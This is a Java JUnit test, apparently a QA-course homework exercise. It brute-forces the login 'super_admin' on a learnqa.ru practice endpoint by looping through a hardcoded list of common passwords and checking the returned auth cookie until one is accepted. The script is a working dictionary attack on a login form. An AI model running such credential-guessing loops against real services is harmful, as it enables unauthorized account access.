import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Ex9Test {
    @Test
    public void testForCheckPassword(){
        List<String> listOfPasswords = new ArrayList<>();
        listOfPasswords.add("1234");
        listOfPasswords.add("12345");
        listOfPasswords.add("111111");
        listOfPasswords.add("121212");
        listOfPasswords.add("123123");
        listOfPasswords.add("123456");
        listOfPasswords.add("555555");
        listOfPasswords.add("654321");
        listOfPasswords.add("666666");
        listOfPasswords.add("696969");
        listOfPasswords.add("888888");
        listOfPasswords.add("1234567");
        listOfPasswords.add("7777777");
        listOfPasswords.add("12345678");
        listOfPasswords.add("123456789");
        listOfPasswords.add("1234567890");
        listOfPasswords.add("!@#$%^&*");
        listOfPasswords.add("123qwe");
        listOfPasswords.add("1q2w3e4r");
        listOfPasswords.add("1qaz2wsx");
        listOfPasswords.add("aa123456");
        listOfPasswords.add("abc123");
        listOfPasswords.add("access");
        listOfPasswords.add("admin");
        listOfPasswords.add("adobe123[a]");
        listOfPasswords.add("ashley");
        listOfPasswords.add("azerty");
        listOfPasswords.add("bailey");
        listOfPasswords.add("baseball");
        listOfPasswords.add("batman");
        listOfPasswords.add("charlie");
        listOfPasswords.add("donald");
        listOfPasswords.add("dragon");
        listOfPasswords.add("flower");
        listOfPasswords.add("Football");
        listOfPasswords.add("freedom");
        listOfPasswords.add("hello");
        listOfPasswords.add(" hottie");
        listOfPasswords.add("iloveyou");
        listOfPasswords.add("jesus");
        listOfPasswords.add("letmein");
        listOfPasswords.add("login");
        listOfPasswords.add("lovely");
        listOfPasswords.add("loveme");
        listOfPasswords.add("master");
        listOfPasswords.add("michael");
        listOfPasswords.add("monkey");
        listOfPasswords.add("mustang");
        listOfPasswords.add("ninja");
        listOfPasswords.add("passw0rd");
        listOfPasswords.add("password");
        listOfPasswords.add("password1");
        listOfPasswords.add("photoshop[a]");
        listOfPasswords.add("princess");
        listOfPasswords.add("qazwsx");
        listOfPasswords.add("qwerty");
        listOfPasswords.add("qwerty123");
        listOfPasswords.add("qwertyuiop");
        listOfPasswords.add("shadow");
        listOfPasswords.add("solo");
        listOfPasswords.add("starwars");
        listOfPasswords.add("sunshine");
        listOfPasswords.add("superman");
        listOfPasswords.add("trustno1");
        listOfPasswords.add("welcome");
        listOfPasswords.add("whatever");
        listOfPasswords.add("zaq1zaq1");

        String rightCookie = "You are NOT authorized";
        int index = 0;
        while (rightCookie.equals("You are NOT authorized")){
            Map<String,String> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", listOfPasswords.get(index));
            Response response = RestAssured
                    .given()
                    .body(data)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String responseCookie = response.getCookie("auth_cookie");
            Map<String,String> cookies = new HashMap<>();
            if (responseCookie !=null){
                cookies.put("auth_cookie",responseCookie);
            }
            Response checkCookie = RestAssured
                    .given()
                    .cookies(cookies)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            rightCookie = checkCookie.print();
            if(rightCookie.equals("You are authorized"))
            {
                System.out.println("right password: " + listOfPasswords.get(index));
            }
            else index++;
        }
    }
}
